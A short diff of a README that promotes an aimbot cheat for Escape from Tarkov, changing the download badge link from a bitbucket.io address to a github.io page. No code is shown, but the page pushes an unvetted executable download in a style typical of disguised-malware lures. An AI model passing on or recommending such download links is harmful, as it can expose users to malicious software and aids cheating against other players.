@@ -2,7 +2,7 @@
 
 **Still missing your shots while that kitted PMC lasers you from 100 meters? With a proper EFT aimbot, every bullet hits, every shot counts, and every raid ends with you on top of the loot pile.**
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload6.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://EFT-Aimbot-vef.github.io/.github)
 ---
 
 ## 🔍 What Is an EFT Aimbot?
